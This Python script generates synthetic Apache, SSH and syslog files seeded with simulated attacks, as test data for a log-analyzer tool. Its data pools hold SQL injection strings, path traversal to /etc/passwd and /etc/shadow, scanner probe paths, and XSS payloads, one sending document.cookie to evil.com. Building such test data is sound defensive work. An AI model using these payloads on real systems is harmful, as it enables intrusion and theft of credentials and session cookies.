#!/usr/bin/env python3
"""
Test log generator for log-analyzer.
Generates realistic Apache, SSH, and syslog files with embedded threats.

Usage:
    python generate_test_logs.py                  # generates all formats
    python generate_test_logs.py --format apache  # only Apache
    python generate_test_logs.py --format ssh     # only SSH
    python generate_test_logs.py --format syslog  # only syslog
    python generate_test_logs.py --days 3         # 3 days of logs
"""

import argparse
import gzip
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path


# ── Data pools ────────────────────────────────────────────────────────────────

NORMAL_IPS = [
    "85.241.10.4", "31.22.180.12", "77.54.200.33", "193.137.100.5",
    "188.250.45.67", "89.154.30.21", "109.48.77.90", "62.169.200.14",
    "217.129.64.3", "195.22.33.100", "46.189.12.55", "79.168.44.20",
]

ATTACKER_IPS = {
    "brute_ssh":   "45.33.32.156",
    "brute_http":  "185.220.101.7",
    "sqli":        "198.51.100.99",
    "xss":         "203.0.113.42",
    "traversal":   "192.0.2.77",
    "scanner":     "198.199.67.12",
    "high_rate":   "162.142.125.0",
    "blacklist":   "91.240.118.172",
}

NORMAL_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15',
]

SCANNER_UAS = [
    'Nikto/2.1.6', 'sqlmap/1.8.4#stable', 'Nmap Scripting Engine',
    'masscan/1.3', 'gobuster/3.6', 'dirbuster/1.0-RC1',
]

NORMAL_PATHS = [
    '/', '/index.html', '/about', '/contact', '/products', '/services',
    '/login', '/dashboard', '/api/users', '/api/products', '/api/status',
    '/static/css/main.css', '/static/js/app.js', '/favicon.ico',
    '/robots.txt', '/sitemap.xml', '/blog', '/blog/post-1',
]

SQLI_PATHS = [
    "/login?user=admin'--",
    "/search?q=1' UNION SELECT username,password FROM users--",
    "/api/user?id=1 OR 1=1",
    "/products?cat=1; DROP TABLE products--",
    "/login?user=' OR '1'='1",
    "/api/data?id=1 AND SLEEP(5)--",
]

XSS_PATHS = [
    '/search?q=<script>alert(1)</script>',
    '/comment?text=<img src=x onerror=alert(document.cookie)>',
    '/profile?name="><script>fetch("https://evil.com?c="+document.cookie)</script>',
    '/api/message?body=<svg onload=alert(1)>',
]

TRAVERSAL_PATHS = [
    '/../../../etc/passwd',
    '/download?file=../../../etc/shadow',
    '/static/../../../etc/hostname',
    '/assets/../../../../windows/win.ini',
]

SCAN_PATHS = [
    '/.git/config', '/.env', '/wp-admin/', '/phpmyadmin/', '/admin/',
    '/.htaccess', '/config.php', '/backup.zip', '/db.sql',
    '/server-status', '/actuator/env', '/xmlrpc.php', '/wp-login.php',
    '/cgi-bin/test.cgi', '/.DS_Store', '/swagger.json', '/graphql',
]

SSH_USERS_COMMON = ['root', 'admin', 'ubuntu', 'user', 'pi', 'oracle', 'postgres']
SSH_USERS_LEGIT  = ['deploy', 'backup', 'admin']

SYSLOG_MSGS = {
    'kernel':         ['Initializing cgroup subsys cpuset', 'EXT4-fs mounted filesystem'],
    'systemd':        ['Started Session 42 of user deploy.', 'Stopping Apache HTTP Server...'],
    'cron':           ['(root) CMD (/usr/bin/certbot renew --quiet)'],
    'sudo':           ['deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/systemctl restart nginx'],
    'ufw':            ['BLOCK IN=eth0 SRC=198.51.100.1 DST=10.0.0.1 PROTO=TCP DPT=22'],
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _rand_ts(base: datetime, jitter_s: int = 3600) -> datetime:
    return base + timedelta(seconds=random.randint(0, jitter_s))


def _apache(ts, ip, method, path, status, size, ua, referer='-'):
    ts_s = ts.strftime('%d/%b/%Y:%H:%M:%S +0000')
    return f'{ip} - - [{ts_s}] "{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'


def _ssh_fail(ts, ip, user):
    ts_s = ts.strftime('%b %d %H:%M:%S')
    return (f'{ts_s} web01 sshd[{random.randint(1000,9999)}]: '
            f'Failed password for {user} from {ip} port {random.randint(40000,65000)} ssh2')


def _ssh_ok(ts, ip, user):
    ts_s = ts.strftime('%b %d %H:%M:%S')
    return (f'{ts_s} web01 sshd[{random.randint(1000,9999)}]: '
            f'Accepted publickey for {user} from {ip} port {random.randint(40000,65000)} ssh2')


def _syslog(ts, service, msg):
    ts_s = ts.strftime('%b %d %H:%M:%S')
    return f'{ts_s} web01 {service}[{random.randint(100,9999)}]: {msg}'


# ── Generators ────────────────────────────────────────────────────────────────

def gen_apache(base: datetime, days: int = 1) -> list:
    lines = []
    end = base + timedelta(days=days)
    cur = base

    # Normal traffic
    while cur < end:
        for ip in random.sample(NORMAL_IPS, k=random.randint(3, 8)):
            ts  = _rand_ts(cur, 3600)
            st  = random.choices([200, 301, 304, 404, 500], weights=[70, 5, 10, 12, 3])[0]
            lines.append(_apache(ts, ip, 'GET', random.choice(NORMAL_PATHS),
                                 st, random.randint(200, 50000), random.choice(NORMAL_UAS)))
        cur += timedelta(minutes=10)

    ip = ATTACKER_IPS['sqli']
    for _ in range(25):
        lines.append(_apache(_rand_ts(base + timedelta(hours=2), 1800),
                             ip, 'GET', random.choice(SQLI_PATHS), 200, 512,
                             random.choice(NORMAL_UAS)))

    ip = ATTACKER_IPS['xss']
    for path in XSS_PATHS * 4:
        lines.append(_apache(_rand_ts(base + timedelta(hours=5), 600),
                             ip, 'POST', path, 200, 128, random.choice(NORMAL_UAS)))

    ip = ATTACKER_IPS['traversal']
    for path in TRAVERSAL_PATHS * 3:
        lines.append(_apache(_rand_ts(base + timedelta(hours=8), 300),
                             ip, 'GET', path, 403, 256, random.choice(NORMAL_UAS)))

    ip = ATTACKER_IPS['scanner']
    ua = random.choice(SCANNER_UAS)
    for path in SCAN_PATHS * 2:
        lines.append(_apache(_rand_ts(base + timedelta(hours=11), 900),
                             ip, 'GET', path, 404, 128, ua))

    ip = ATTACKER_IPS['brute_http']
    t0 = base + timedelta(hours=14)
    for i in range(40):
        lines.append(_apache(t0 + timedelta(seconds=i * 12),
                             ip, 'POST', '/login', 401, 64, random.choice(NORMAL_UAS)))

    ip = ATTACKER_IPS['high_rate']
    t0 = base + timedelta(hours=17)
    for i in range(200):
        lines.append(_apache(t0 + timedelta(seconds=i * 2),
                             ip, 'GET', random.choice(NORMAL_PATHS), 200, 1024,
                             random.choice(NORMAL_UAS)))

    ip = ATTACKER_IPS['blacklist']
    for _ in range(10):
        lines.append(_apache(_rand_ts(base + timedelta(hours=20), 600),
                             ip, 'GET', random.choice(SCAN_PATHS), 200, 512,
                             random.choice(SCANNER_UAS)))

    night = base.replace(hour=2, minute=0)
    for _ in range(15):
        lines.append(_apache(_rand_ts(night, 7200),
                             random.choice(NORMAL_IPS), 'GET',
                             random.choice(NORMAL_PATHS), 200, 2048,
                             random.choice(NORMAL_UAS)))

    lines.sort(key=lambda l: l[l.find('[')+1:l.find(']')])
    return lines


def gen_ssh(base: datetime, days: int = 1) -> list:
    lines = []
    end = base + timedelta(days=days)
    cur = base

    while cur < end:
        for user in SSH_USERS_LEGIT:
            if random.random() < 0.3:
                lines.append(_ssh_ok(cur + timedelta(minutes=random.randint(0, 60)),
                                     random.choice(NORMAL_IPS), user))
        cur += timedelta(hours=4)

    t0 = base + timedelta(hours=3)
    for i in range(60):
        lines.append(_ssh_fail(t0 + timedelta(seconds=i * 8),
                               ATTACKER_IPS['brute_ssh'],
                               random.choice(SSH_USERS_COMMON)))

    for _ in range(30):
        ip = f'45.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'
        lines.append(_ssh_fail(_rand_ts(base, 86400 * days),
                               ip, random.choice(SSH_USERS_COMMON)))
    lines.sort()
    return lines


def gen_syslog(base: datetime, days: int = 1) -> list:
    lines = []
    end = base + timedelta(days=days)
    cur = base

    while cur < end:
        for _ in range(random.randint(5, 15)):
            service = random.choice(list(SYSLOG_MSGS))
            msg = random.choice(SYSLOG_MSGS[service])
            lines.append(_syslog(_rand_ts(cur, 3600), service, msg))
        cur += timedelta(hours=1)

    for _ in range(20):
        msg = f'BLOCK IN=eth0 SRC={ATTACKER_IPS["brute_ssh"]} DST=10.0.0.1 PROTO=TCP DPT=22 SYN'
        lines.append(_syslog(_rand_ts(base + timedelta(hours=3), 3600), 'ufw', msg))

    lines.sort()
    return lines


# ── Output ────────────────────────────────────────────────────────────────────

def _write(path: Path, lines: list, compress: bool = False) -> None:
    content = '\n'.join(lines) + '\n'
    if compress:
        with gzip.open(str(path) + '.gz', 'wt', encoding='utf-8') as f:
            f.write(content)
        print(f'  Written: {path}.gz  ({len(lines):,} lines)')
    else:
        path.write_text(content, encoding='utf-8')
        print(f'  Written: {path}  ({len(lines):,} lines)')


def _write_config(out_dir: Path) -> None:
    cfg = out_dir / 'config'
    cfg.mkdir(exist_ok=True)
    (cfg / 'blacklist.txt').write_text(
        f"# Known threat actors\n{ATTACKER_IPS['blacklist']}\n", encoding='utf-8')
    (cfg / 'whitelist.txt').write_text(
        "# Internal / trusted IPs\n10.0.0.1\n192.168.1.1\n", encoding='utf-8')
    print('  Written: config/blacklist.txt  config/whitelist.txt')


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description='Generate test logs for log-analyzer.')
    p.add_argument('--format', choices=['apache', 'ssh', 'syslog', 'all'],
                   default='all')
    p.add_argument('--days', type=int, default=1)
    p.add_argument('--out', default='test_logs')
    p.add_argument('--compress', action='store_true')
    args = p.parse_args()

    if not 1 <= args.days <= 30:
        print('Error: --days must be between 1 and 30')
        sys.exit(1)

    out = Path(args.out)
    out.mkdir(exist_ok=True)
    base = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    base -= timedelta(days=args.days - 1)

    print(f'\nGenerating {args.days} day(s) of test logs -> {out}/\n')

    if args.format in ('apache', 'all'):
        _write(out / 'access.log', gen_apache(base, args.days), compress=False)
        if args.compress:
            _write(out / 'access.log', gen_apache(base, args.days), compress=True)

    if args.format in ('ssh', 'all'):
        _write(out / 'auth.log', gen_ssh(base, args.days))

    if args.format in ('syslog', 'all'):
        _write(out / 'syslog', gen_syslog(base, args.days))

    _write_config(out)

    print('\nExample commands:\n')
    print(f'  python log_analyzer.py --file {out}/access.log --export html')
    print(f'  python log_analyzer.py --file {out}/access.log --blacklist {out}/config/blacklist.txt')
    print(f'  python log_analyzer.py --file {out}/auth.log --format ssh')
    print(f'  python log_analyzer.py --file {out}/syslog --format syslog\n')


if __name__ == '__main__':
    main()
